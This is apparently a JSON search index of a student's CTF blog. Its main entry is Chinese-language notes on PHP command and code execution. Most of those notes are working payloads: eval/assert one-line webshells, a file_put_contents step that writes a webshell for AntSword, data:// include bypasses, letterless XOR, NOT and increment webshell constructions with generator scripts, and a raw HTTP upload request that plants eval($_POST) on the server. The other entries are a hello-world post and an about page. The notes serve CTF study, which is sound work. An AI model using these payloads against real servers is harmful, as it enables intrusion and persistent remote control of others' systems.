[{"content":"命令执行 eval内执行的是php代码 所以必须要以分号结尾\neval是代码执行函数\nsystem是命令执行函数\ncat是具体的函数\nphpinfo();\nsystem(\u0026rsquo;ls\u0026rsquo;) ; 当前目录\nsystem(\u0026rsquo;ls%20/\u0026rsquo;) ;根目录\nsystem(\u0026lsquo;cat%20f*\u0026rsquo;);\n代码执行函数 eval() ：结尾加分号 assert() ：结尾不加分号 call_user_func() : 1. \u0026lt;?php call_user_func(\u0026#34;assert\u0026#34;,$_POST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; //post:cmd=system(whoami) 蚁剑连接 cmd 2. \u0026lt;?php call_user_func($_POST[\u0026#34;fun\u0026#34;],$_POST[\u0026#34;para\u0026#34;])?\u0026gt; //post:fun=assert\u0026amp;para=phpinfo(); create_function(): array_map(): call_user_func_array(): array_filter(): uasort(): preg_replace(): PHP中常见的命令执行函数与代码执行函数_红烧兔纸的博客-CSDN博客\neval函数和system函数的区别——代码执行漏洞和命令执行漏洞_php命令执行函数eval和system区别_美豆阿的博客-CSDN博客\n命令执行函数 system(): passthru(): exec(): pcntl_exec(): shell_exec(): popen()/proc_popen(): echo(`ls`): 具体函数 cat tac more nl 代码执行函数被ban 1.反字节符 echo(`ls`); 2.参数＋eval eval($_GET[1];\u0026amp;1=phpinfo()); eval($_GET[1];\u0026amp;1=system(\u0026#39;ls\u0026#39;));//这样只会识别到前面的 这是又传了一个参数，所以不会被检查 3.参数+include （这个没有分号‘；’） include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/read=convert.base64-encode/resource=flag.php //其中的?\u0026gt;用来绕过分号，因为?\u0026gt;默认给你偷偷加了一个分号 4.写入木马 file_put_contents(\u0026#34;aaa.php\u0026#34;,%20%27\u0026lt;?php%20eval($_POST[\u0026#34;cmd\u0026#34;]);%20?\u0026gt;%27);) //将后面的代码写入aaa.php中 访问aaa.php 确认写入，蚁剑连接 5、6都需要一步一步去看这来： //print_t(scandir(pos(localeconv())));可以看到当前目录 //print_r(scandir(getcwd()));也可以 getcwd()函数返回当前工作目录 5.使用pos(localeconv)来获取小数点 show_source(next(array_reverse(scandir(pos(localeconv()))))); //localeconv可以返回包含小数点的一个数组，用pos取数组中的第一个元素———小数点， 用scandir结合可以扫当前目录。 //然后re数组 取下一个数组元素 就是flag.php //getcwd()函数返回当前的工作目录 6. print(get_defined_vars()); eval(array_pop(next(get_defined_vars()))); //get_defined_vars()返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户自定义的变量。 //array_pop()函数 删除数组中的最后一个元素并返回其值 7.通配符 直接匹配flag.php输出 code=?\u0026gt;\u0026lt;?=`/???/??? ????.???` 8.过滤了函数： code=?\u0026gt;\u0026lt;?=`ls`; web38 \u0026lt;?php //flag in flag.php error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ //过滤了flag函数 include($c); echo $flag; } }else{ highlight_file(__FILE__); } 这里需要用伪协议绕过 但不能用filter 因为filter协议不加密输入的东西 只把输出的东西加密\n使用方法为 data://text/plain;base64,内容 ：要写的命令用base64编码放入内容 \u0026lt;?php system('cat flag.php');?\u0026gt;\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==\n无参RCE 参考链接\n无字母数字webshell总结 - 先知社区 (aliyun.com)\n0.或（ | ） 1. 异或（ ^ ） c=(\u0026#34;%13%19%13%14%05%0d\u0026#34;|\u0026#34;%60%60%60%60%60%60\u0026#34;)(\u0026#34;%03%01%14%00%06%0c%01%00\u0026#34;|\u0026#34;%60%60%60%20%60%60%60%2a\u0026#34;) system(\u0026#34;cat fla*\u0026#34;) 代码\nif(preg_match(\u0026#34;/(\\/|[A-Za-z]+)/\u0026#34;,$code)) { print(\u0026#34;漏,你不能这样\u0026#34;); 异或解析\n在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。\n异或脚本\nstr = r\u0026#34;~!@#$%^\u0026amp;*()_+\u0026lt;\u0026gt;?:,.;-[]{}`\\/\u0026#34; needstr = \u0026#34;T\u0026#34; # 输入想要异或的字符串 dictin = {} for c in range(len(needstr)): for i in range(0, len(str)): for j in range(0, len(str)): a = ord(str[i]) ^ ord(str[j]) if needstr[c] == chr(a): print(\u0026#39;(\u0026#39; + \u0026#39;\u0026#34;\u0026#39; + str[i] + \u0026#39;\u0026#34;\u0026#39; + \u0026#39;^\u0026#39; + \u0026#39;\u0026#34;\u0026#39; + str[j] + \u0026#39;\u0026#34;\u0026#39; + \u0026#39;)\u0026#39; + \u0026#39; \u0026#39; + \u0026#39;is\u0026#39; + \u0026#39; \u0026#39; + chr(a)) dictin[c] = chr(a) 高级版 可控\n\u0026lt;?php $shell = \u0026#34;a\u0026#34;; $result1 = \u0026#34;\u0026#34;; $result2 = \u0026#34;\u0026#34;; for($num=0;$num\u0026lt;=strlen($shell);$num++) { for($x=33;$x\u0026lt;=126;$x++) { if(judge(chr($x))) { for($y=33;$y\u0026lt;=126;$y++) { if(judge(chr($y))) { $f = chr($x)^chr($y); if($f == $shell[$num]) { $result1 .= chr($x); $result2 .= chr($y); break 2; } } } } } } echo $result1; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo $result2; function judge($c) { if(!preg_match(\u0026#39;/[a-z0-9]/is\u0026#39;,$c)) { return true; } return false; } \u0026lt;?php $_ = \u0026#34;!((%)(\u0026#34;^\u0026#34;@[[@[\\\\\u0026#34;; //构造出assert $__ = \u0026#34;!+/((\u0026#34;^\u0026#34;~{`{|\u0026#34;; //构造出_POST $___ = $$__; //$___ = $_POST $_($___[_]); //assert($_POST[_]); 如果payload中有一些特殊字符，需要url编码\nGET型构造\n相当于传了两个参数 第一个是_ 第二个是__\npayload:\ncode=$_=(\u0026#34;$\u0026#34;^\u0026#34;{\u0026#34;).(\u0026#34;{\u0026#34;^\u0026#34;\u0026lt;\u0026#34;).(\u0026#34;{\u0026#34;^\u0026#34;\u0026gt;\u0026#34;).(\u0026#34;}\u0026#34;^\u0026#34;)\u0026#34;);${$_}[_](${$_}[__]);\u0026amp;_=system\u0026amp;__=ls 让_GET=$_; ${$_}[_] = $_GET[_] 传参 参数名是_ system(ls);====${$_}[_](${$_}[__]); POST型构造\nassert($_POST[_]); $_=(\u0026#39;%01\u0026#39;^\u0026#39;`\u0026#39;).(\u0026#39;%13\u0026#39;^\u0026#39;`\u0026#39;).(\u0026#39;%13\u0026#39;^\u0026#39;`\u0026#39;).(\u0026#39;%05\u0026#39;^\u0026#39;`\u0026#39;).(\u0026#39;%12\u0026#39;^\u0026#39;`\u0026#39;).(\u0026#39;%14\u0026#39;^\u0026#39;`\u0026#39;); // $_=\u0026#39;assert\u0026#39;; $__=\u0026#39;_\u0026#39;.(\u0026#39;%0D\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;%2F\u0026#39;^\u0026#39;`\u0026#39;).(\u0026#39;%0E\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;%09\u0026#39;^\u0026#39;]\u0026#39;); // $__=\u0026#39;_POST\u0026#39;; $___=$$__; $_($___[_]); // assert($_POST[_]); payload:\n$_=(\u0026#39;%01\u0026#39;^\u0026#39;`\u0026#39;).(\u0026#39;%13\u0026#39;^\u0026#39;`\u0026#39;).(\u0026#39;%13\u0026#39;^\u0026#39;`\u0026#39;).(\u0026#39;%05\u0026#39;^\u0026#39;`\u0026#39;).(\u0026#39;%12\u0026#39;^\u0026#39;`\u0026#39;).(\u0026#39;%14\u0026#39;^\u0026#39;`\u0026#39;);$__=\u0026#39;_\u0026#39;.(\u0026#39;%0D\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;%2F\u0026#39;^\u0026#39;`\u0026#39;).(\u0026#39;%0E\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;%09\u0026#39;^\u0026#39;]\u0026#39;);$___=$$__;$_($___[_]); 2.取反（ ~ ） 情况：\n如果过滤了 ^ 但没过滤 ~\n取反脚本\ns = \u0026#34;input\u0026#34; for i in range(len(s)): print(\u0026#39;%\u0026#39;+str(hex((255)-ord(s[i]))[2:]),end=\u0026#39;\u0026#39;) system -\u0026gt; %8c%86%8c%8b%9a%92\nls -\u0026gt; %93%8c%df%d0\n合起来是 ?wllm=~(~%8C%86%8C%8B%9A%92)(~%93%8c%df%d0);\n3.自增自减 原理：\n\u0026#34;A\u0026#34;++ ==\u0026gt; \u0026#34;B\u0026#34; 只要得到ASCII的一个值就可以得到任何字符\nphp中如何得到A\n当强制连接字符串和数组的时候 数组就会别转换成字符串 其值为 Array 取第一个就为A\n\u0026lt;?php $_=[].\u0026#39;\u0026#39;; //得到\u0026#34;Array\u0026#34; $___ = $_[$__]; //得到\u0026#34;A\u0026#34;，$__没有定义，默认为False也即0，此时$___=\u0026#34;A\u0026#34; $__ = $___; //$__=\u0026#34;A\u0026#34; $_ = $___; //$_=\u0026#34;A\u0026#34; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //得到\u0026#34;S\u0026#34;，此时$__=\u0026#34;S\u0026#34; $___ .= $__; //$___=\u0026#34;AS\u0026#34; $___ .= $__; //$___=\u0026#34;ASS\u0026#34; $__ = $_; //$__=\u0026#34;A\u0026#34; $__++;$__++;$__++;$__++; //得到\u0026#34;E\u0026#34;，此时$__=\u0026#34;E\u0026#34; $___ .= $__; //$___=\u0026#34;ASSE\u0026#34; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__;$__++; //得到\u0026#34;R\u0026#34;，此时$__=\u0026#34;R\u0026#34; $___ .= $__; //$___=\u0026#34;ASSER\u0026#34; $__++;$__++; //得到\u0026#34;T\u0026#34;，此时$__=\u0026#34;T\u0026#34; $___ .= $__; //$___=\u0026#34;ASSERT\u0026#34; $__ = $_; //$__=\u0026#34;A\u0026#34; $____ = \u0026#34;_\u0026#34;; //$____=\u0026#34;_\u0026#34; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //得到\u0026#34;P\u0026#34;，此时$__=\u0026#34;P\u0026#34; $____ .= $__; //$____=\u0026#34;_P\u0026#34; $__ = $_; //$__=\u0026#34;A\u0026#34; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //得到\u0026#34;O\u0026#34;，此时$__=\u0026#34;O\u0026#34; $____ .= $__; //$____=\u0026#34;_PO\u0026#34; $__++;$__++;$__++;$__++; //得到\u0026#34;S\u0026#34;，此时$__=\u0026#34;S\u0026#34; $____ .= $__; //$____=\u0026#34;_POS\u0026#34; $__++; //得到\u0026#34;T\u0026#34;，此时$__=\u0026#34;T\u0026#34; $____ .= $__; //$____=\u0026#34;_POST\u0026#34; $_ = $$____; //$_=$_POST $___($_[_]); //ASSERT($POST[_]) php对大小写不敏感\n用url编码\n4.过滤了_ PHP中的短标签\n\u0026lt;??\u0026gt; == \u0026lt;?php\u0026gt; //需要开启short_open_tag \u0026lt;?=?\u0026gt; == \u0026lt;? echo\u0026gt; //默认开启 payload:\n\u0026gt;?\u0026lt;?=`{${~\u0026#34;%a0%b8%ba%ab\u0026#34;}[%a0]}`?\u0026gt; 5.过滤了; 用短标签绕过\n6.过滤了$ PHP7:\n在PHP7中，我们可以使用($a)()这种方法来执行命令。这里我使用call_user_func()来举例(不使用assert()的原因上面已经解释过)。 我构造了\nshell=(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,\u0026#39;\u0026#39;); 其中\n~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c是\u0026quot;call_user_func\u0026quot;，\n~%8c%86%8c%8b%9a%92是\u0026quot;system\u0026quot;，\n~%88%97%90%9e%92%96是\u0026quot;whoami\u0026quot;。 成功执行命令\nPHP5:\nphp5不支持上面的方法来执行命令，\n无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)\n1. Linux下可以用 . 来执行文件 2. PHP中POST上传文件会把我们上传的文件暂时存在/tmp文件夹中，默认文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母\n用这个来锁定临时文件 需要多传几次\n. /???/????????[@-[] 可以根据实际\nPOST /?code=?\u0026gt;\u0026lt;?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?\u0026gt; HTTP/1.1 Host: xxxxxx:2333 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type:multipart/form-data;boundary=--------123 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Content-Length: 106 ----------123 Content-Disposition:form-data;name=\u0026#34;file\u0026#34;;filename=\u0026#34;1.txt\u0026#34; echo \u0026#34;\u0026lt;?php eval(\\$_POST[\u0026#39;shell\u0026#39;]);\u0026#34; \u0026gt; success.php ----------123-- 这里可以直接一句话 上蚁剑\n管道符的使用 if(!preg_match(\u0026#34;/;|cat|flag/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); }//将结果重定向到空文件 错误也是 即丢弃 } 1,\u0026#34; ; \u0026#34;: 执行完前面的语句在执行后面的语句。 2.“ | “: 显示后面的语句的执行结果。（文件名+|base64） 3.” || “：当前的语句执行出错时，执行后面的语句。前面的语句只能为假后面的语句才能执行。 4.” \u0026amp; “：两条命令都执行，如果前面语句为假则执行后面的语句，前面的语句可真可假。 5.” \u0026amp;\u0026amp; “：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则执行两条命令，前面的语句只能为真。 ","permalink":"https://DiFly0828.github.io/en/posts/web/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","summary":"命令执行 eval内执行的是php代码 所以必须要以分号结尾 eval是代码执行函数 system是命令执行函数 cat是具体的函数 phpinfo(); system(\u0026rsquo;ls\u0026rsquo;) ; 当前目录 system(\u0026rsquo;ls%20/\u0026rsquo;) ;根目录 system(\u0026lsquo;cat%20f*\u0026rsquo;); 代码执行函数 eval() ：结尾加分号 assert() ：结尾不加分号 call_user_func() : 1. \u0026lt;?php call_user_func(\u0026#34;assert\u0026#34;,$_POST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; //post:cmd=system(whoami) 蚁剑连接 cmd 2. \u0026lt;?php call_user_func($_POST[\u0026#34;fun\u0026#34;],$_POST[\u0026#34;para\u0026#34;])?\u0026gt; //post:fun=assert\u0026amp;para=phpinfo(); create_function(): array_map(): call_user_func_array(): array_filter(): uasort(): preg_replace(): PHP中常见的命令执行函数与代码执行函数_红烧","title":"命令执行"},{"content":"hello world hello world\n","permalink":"https://DiFly0828.github.io/en/posts/web/helloworld/","summary":"hello world hello world","title":"Helloworld"},{"content":"关于我\nctfer: DiFly 职业: 学生 ","permalink":"https://DiFly0828.github.io/en/about/","summary":"关于我 ctfer: DiFly 职业: 学生","title":"🙋🏻‍♂️关于"}]